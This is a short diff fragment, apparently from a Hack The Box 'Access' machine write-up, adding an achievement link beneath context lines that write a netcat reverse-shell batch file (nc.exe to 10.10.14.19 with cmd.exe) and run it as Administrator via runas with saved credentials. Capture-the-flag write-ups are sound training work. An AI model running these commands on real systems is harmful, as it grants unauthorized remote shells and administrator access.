@@ -22,3 +22,4 @@ echo c:\Users\security\Desktop\nc.exe 10.10.14.19 6789 -e cmd.exe > reverse.ba
 
 C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\security\Desktop\reverse.bat" 
 ```
+https://www.hackthebox.com/achievement/machine/336799/156
